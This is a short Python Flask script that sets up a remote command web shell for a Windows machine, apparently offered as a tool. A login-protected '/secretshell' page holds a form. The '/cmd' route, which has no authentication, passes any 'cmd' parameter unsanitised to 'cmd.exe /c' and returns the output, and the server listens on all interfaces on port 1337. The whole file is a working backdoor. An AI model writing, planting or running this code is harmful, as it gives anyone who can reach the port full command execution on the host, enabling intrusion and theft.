from flask import *
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash
import threading
import subprocess
import os

app = Flask(__name__)
auth = HTTPBasicAuth()

password = "<password>"
user = {"<username>" : generate_password_hash(password)}



@auth.verify_password
def verify_password(username, password):
    if username in user and \
            check_password_hash(user.get(username), password):
        return username


@app.route("/secretshell")
@auth.login_required
def secret_shell():

    return '''
    <!DOCTYPE html>
<html>
<body>

<form action="/cmd">
  <label for="cmd">Command to execute:</label><br>
  <input type="text" id="cmd" name="cmd"><br>
  <input type="submit" value="Execute">
</form>
</body>
</html>


    '''

@app.route("/cmd", methods=["POST", "GET"])
def exec_cmd():
    cmd = request.args.get("cmd")
    result = os.popen('cmd.exe /c {}'.format(cmd)).read()
    resp = make_response(result)
    return resp

app.run(host="0.0.0.0", port=1337)
